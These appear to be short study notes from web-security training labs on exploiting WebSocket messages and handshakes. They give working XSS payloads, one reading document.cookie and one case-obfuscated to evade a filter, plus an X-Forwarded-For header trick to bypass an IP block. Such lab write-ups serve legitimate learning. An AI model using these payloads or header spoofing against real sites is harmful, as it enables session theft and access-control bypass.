# WebSockets

## Manipulating WebSocket messages to exploit vulnerabilities

The sent via browser automatically get encoded. To trigger an XSS alert message 
we can send this unfiltered payload through burp repeater.

``` json
{ "message": <img src=asdf onerror='alert(document.cookie)'> }
```

## Manipulating the WebSocket handshake to exploit vulnerabilities

To work around the ip block we need to set the `X-Forwarded-For` header:  
![ws settings](images/ws-connection-connection-settings.png)  
![ws set header](images/ws-connection-set-header.png)

For the XSS payload:

``` json
{ "message":"<img src=1 oNeRrOr=alert`123`>" }
```
